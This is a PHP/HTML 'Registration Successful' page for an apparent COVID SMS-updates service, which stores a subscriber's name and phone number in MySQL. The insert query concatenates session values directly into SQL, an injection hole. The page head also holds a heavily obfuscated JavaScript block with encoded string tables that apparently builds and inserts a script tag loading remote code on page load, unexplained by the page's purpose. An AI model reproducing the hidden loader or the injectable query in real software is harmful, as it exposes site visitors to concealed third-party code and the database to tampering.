<?php
session_start();
if ($_SESSION["name"] && $_SESSION["number"]) {
$mysqli = new mysqli('', '', '','');
// Check connection
if ($mysqli->connect_error) {
  die("Unsuccessful. Please contact admin tarunkodakandla@gmail.com " . $conn->connect_error);
}
$query="INSERT INTO sms_subscribers(Name,Number) Values('".$_SESSION["name"]."','".$_SESSION["number"]."')";
$result = mysqli_query($mysqli,$query); 
$mysqli -> close();
?>

<!doctype html>
<html>
<head>
	<title>Get Covid Updates</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<script type="text/javascript" data-cfasync="false">
    /*<![CDATA[/* */
    (function(){var c36cef9791a9ed80e40ac3888ad42c80="EbbGrPXrIR5Vw06MkOOfi0lI08SEMVWF6qz6s6UhbcyQePQMPBJc8hyHFU5onTYDgvmvPlgvJrD9";var a=['P3vDjsOmw5I1I1XDrQ==','HXbDmsOGwp0HBMKbEzxMw6xIw7A=','UmrDnDhNIg==','w5NTRkwlwoDDhcKFZsKtSsOT','wowMwqlHSFDDl3kawpo1MSlbGQPDkcOGw44W','esOjHsKx','w6tVFBxP','dMKrwpHCohIjw7Ih','wrBSaX5GZSdtXMOtw6k8w5p9w4s=','CXbDicOGwp4GD8Kd','cX/DmMOFw44uw7ZPVWPCn0bCtnfCrVpbwqlJPcK4wpDCtxcUXVBuwofChsKcw5XClz1gaMKra2sTwrs=','wpbDlcOb','LiUbDcONW8OM','NhLDsXQ0Wg==','IjkbHsOLUcO7ZsOYd2PDnsOy','K8KSw7jDrcO7w7lRI10ew5PDhw==','W1bCoh/Dth0=','RWzDgjBEFMKWw4nDhMKKL8OG','w4nDtXfDhMK3MCfCs8OIw40=','TzLDgcO5KyTClQ==','UsOwWcK2ClHCv1HDvMOwwoo=','dMKhwpTCtgoqw6gFWjsiEgM=','KT8KD8OMDsKRJQ==','w75fHRc=','MArDp8KGwrZ7','KWLDlsKmw4k9OFTDuxXDjXfCr8KvwpFFJ0xew7zCh1TCoz4DasK3M8KyMsKdw4TDk2l4RA=='];(function(b,c){var f=function(g){while(--g){b['push'](b['shift']());}};f(++c);}(a,0x17a));var c=function(b,d){b=b-0x0;var e=a[b];if(c['vjhsMz']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};c['XKNKCp']=g;c['CkDuxr']={};c['vjhsMz']=!![];}var f=c['CkDuxr'][b];if(f===undefined){if(c['rkjghq']===undefined){c['rkjghq']=!![];}e=c['XKNKCp'](e,d);c['CkDuxr'][b]=e;}else{e=f;}return e;};var b=window;b[c('0x11','LR]*')]=[[c('0xa','!eYf'),0x3f917f],[c('0x19','0Jnw'),0x0],[c('0xd','!ZxP'),0x0],[c('0x3','Lny7'),0x0],[c('0x5','@W28'),![]],[c('0x7','upr5'),0x0],[c('0x1','BYjI'),!0x0]];var p=[c('0xb','z[vE'),c('0x16','16na')],f=0x0,q,m=function(){if(!p[f])return;q=b[c('0x15','!ZxP')][c('0x0','h]LB')](c('0x2','bGAh'));q[c('0x9','BjD!')]=c('0x14','0STt');q[c('0x12','BjD!')]=!0x0;var d=b[c('0x13','upr5')][c('0x10','a6Qc')](c('0xe','Lny7'))[0x0];q[c('0x17','MfgJ')]=c('0x8','h]LB')+p[f];q[c('0x6','r[xN')]=c('0xc','z[vE');q[c('0x18','h]LB')]=function(){f++;m();};d[c('0x4','d3wp')][c('0xf','BH3w')](q,d);};m();})();
    /*]]>/* */
    </script>

</head>
<body></br><center> 
<h1 style="text-align:center color:#37eb34">Registration Successful!</h1></center>
</body>
</html>

<?php } else { 
 header("location: http://covidsms.2bz.in",  true,  301 );  exit;
} 
?>


